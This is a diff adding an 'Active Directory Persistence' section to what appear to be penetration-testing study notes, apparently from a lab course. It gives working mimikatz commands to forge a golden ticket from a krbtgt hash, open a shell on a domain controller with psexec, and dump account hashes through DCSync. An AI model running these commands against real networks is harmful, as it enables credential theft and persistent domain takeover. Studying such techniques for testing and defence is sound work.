@@ -81,3 +81,24 @@ _Use it to extract NTLM hashes of all users who have previously logged in to the
 PtH techniques can be used to authenticate to only NTLM supported services. Thus, upgrading NTLM hash to TGT may be quite helpful.
 
 Utilize Pth technique to get shell as different user. Once shell is obtained, perform any action which requires domain permissions. Doing this would subsequently create a TGT.
+
+## Active Directory Persistence
+
+* when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt. If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, or golden tickets.
+
+```
+mimikatz # kerberos::purge
+
+// Golden ticket for 'fakeuser@corp.com'
+mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1682875587-2787523311-2599479668 /krbtgt:75b68238a2394a812888dbfad8415965 /ptt
+
+mimikatz # misc::cmd
+
+C:\Users\offsec.crop> psexec.exe \\dc01 cmd.exe
+```
+
+* While receiving a request for an update, Domain controller does not verify that the request came from a known DC, but only verifies the associated SID has appropriate privileges. Using this, we can request a replication update(with AD admin priv) from a domain controller and obtain the password hashes of every account in Active Directory.
+
+```
+mimikatz # lsadump::dcsync /user:Administrator
+```
